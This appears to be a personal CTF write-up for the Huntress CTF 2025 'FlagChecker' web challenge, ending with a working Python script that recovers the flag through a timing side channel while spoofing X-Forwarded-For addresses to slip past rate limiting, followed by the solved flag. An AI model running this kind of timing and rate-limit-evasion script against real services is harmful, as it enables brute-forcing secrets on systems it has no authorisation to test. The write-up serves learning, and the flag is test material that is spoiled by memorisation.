---
layout: page
title: Huntress CTF 2025 Web
tags: [CTF, Learning, Web]
---

# FlagChecker

Initial testing was to understand the number of requests that could be sent before hitting the suggested security controls in the challenge description. Turned out to be 10.

Established this by sending `curl` requests with the `time` command that each correct character seemed to increase the response time. At this point I tried to get ChatGPT and other AI tools to script me something to achieve a successful timing attack, rotating the **X-Forwarded-For IP** every 10 requests. AI made a total meal of this and overcomplicated everything. I ended up making a Python script to try and solve this, but I kept getting blocked despite the IP rotation.

Having real work to do I left my update with the team and Oshikuru solved it, having noted port **5000** seemed to be a specific target to make the header rotation work as expected. Determined to figure out myself how it was achieved on this port, I went back to manual `curl` testing - noting that my time results would lead to differing character output at the first position after **flag{**. It was then I noticed the **X-Response-Time header**! Updating my script, and chucking it back to ChatGPT got me a simple, streamlined multi-thread approach to solve the challenge in minutes. (After hours of dabbling!)

```python
import requests, time
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock

# CONFIG
TARGET = "http://10.1.97.131:5000/submit"
PREFIX = "flag{"
HEX_LEN = 32
CHARS = "0123456789abcdef"
XFWD_POOL = ["10.0.1." + str(i) for i in range(2,200)]
REQUESTS_PER_IP = 10
MAX_WORKERS = 16
PAUSE_BETWEEN_POS = 0.06

_count_lock = Lock()
_req_count = 0

def get_xfwd():
	global _req_count
	with _count_lock:
		ip = XFWD_POOL[(_req_count // REQUESTS_PER_IP) % len(XFWD_POOL)]
		_req_count += 1
		return ip

def try_candidate(prefix_known, c):
	ip = get_xfwd()
	full = PREFIX + prefix_known + c
	try:
		r = requests.get(TARGET, params={"flag": full}, headers={"X-Forwarded-For": ip}, timeout=8.0)
		xt = r.headers.get("X-Response-Time")
		return c, float(xt) if xt else -1.0
	except:
		return c, -1.0

def main():
	known = ""
	for _ in range(HEX_LEN):
		with ThreadPoolExecutor(max_workers=min(MAX_WORKERS, len(CHARS))) as ex:
			futures = [ex.submit(try_candidate, known, c) for c in CHARS]
			results = {c: v for fut in as_completed(futures) for c, v in [fut.result()]}
		chosen = max(results, key=results.get)
		known += chosen
		time.sleep(PAUSE_BETWEEN_POS) # small gap for thread cleanup

	print(PREFIX + known + "}")

if __name__ == "__main__":
	main()
```

**`flag{77ba0346d9565e77344b9fe40ecf1369}`**